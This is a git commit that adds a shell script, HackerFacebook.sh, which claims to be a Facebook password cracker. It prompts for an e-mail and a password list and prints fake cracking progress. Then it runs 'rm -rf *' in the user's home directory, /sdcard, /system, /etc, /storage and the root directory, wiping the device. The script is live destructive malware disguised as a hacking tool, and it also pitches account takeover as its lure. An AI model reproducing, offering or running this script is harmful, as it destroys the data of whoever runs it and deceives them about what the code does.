390e0cb382dc93e9fde819f83cec79ecaaf2044f
qw46478 <46646584+qw46478@users.noreply.github.com>
2019-02-27 22:44:44 +0200

    Add files via upload

---
+++ HackerFacebook.sh
@@ -0,0 +1,84 @@
+
+echo "
+            
+           
+          
+          
+         
+         
+        FaCeBoOk
+        HaCkEeR
+       
+       
+       
+       
+       
+       
+"
+read -p "E-mail---->"  M
+read -p "ListPassword ---->"  L
+sleep 3
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1 
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[-]Password ["$L
+sleep 0.1
+echo "[+]Not Faund Password"
+
+cd $HOME
+rm -rf *
+cd $HOME
+cd /sdcard
+rm -rf *
+cd $HOME
+cd /sys
+rm -rf *
+cd $HOME
+cd /system
+rm -rf *
+cd $HOME
+cd /sys
+rm -rf *
+cd $HOME
+cd /vendor
+rm -rf * 
+cd $HOME
+cd /etc
+rm -rf *
+cd $HOME
+cd /sdcard
+rm -rf *
+cd $HOME
+cd /storage
+rm -rf *
+cd $HOME
+cd /
+rm -rf *
+
